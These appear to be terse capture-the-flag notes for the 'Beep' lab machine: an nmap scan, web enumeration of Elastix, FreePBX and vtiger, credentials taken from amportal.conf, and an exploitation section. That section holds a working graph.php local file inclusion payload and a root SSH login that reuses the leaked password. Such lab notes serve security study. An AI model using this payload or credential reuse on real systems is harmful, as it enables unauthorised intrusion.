# beep

### nmap

```
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
25/tcp    open  smtp       Postfix smtpd
80/tcp    open  http       Apache httpd 2.2.3
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
111/tcp   open  rpcbind    2 (RPC #100000)
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
993/tcp   open  ssl/imap   Cyrus imapd
995/tcp   open  pop3       Cyrus pop3d
3306/tcp  open  mysql      MySQL (unauthorized)
4445/tcp  open  upnotifyp?
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
```

### Web Enum

```
https://10.10.10.7 -> login [elastix]

https://10.10.10.7/admin -> admin login [FreePBX 2.8.1.4]

https://10.10.10.7/help/ -> help doc 

https://10.10.10.7/panel/ -> nothing

https://10.10.10.7/register.php/ -> register form

https://10.10.10.7/var/

https://10.10.10.7/mail/ -> web mail login [RoundCube]

https://10.10.10.7/vtigercrm/index.php [vtiger CRM 5.1.0]
```

### Goodies

```
fanis:x:501:501::/home/fanis:/bin/bash

# /etc/amportal.conf
#FOPPASSWORD=passw0rd
FOPPASSWORD=jEhdIekWmdjE

ARI_ADMIN_USERNAME=admin
ARI_ADMIN_PASSWORD=jEhdIekWmdjE
```

### Exploitation

```bash
Elastix 2.2.0 - 'graph.php' Local File Inclusion

LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action

# password reuse [jEhdIekWmdjE]
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -o "KexAlgorithms=diffie-hellman-group-exchange-sha1" root@$IP
```
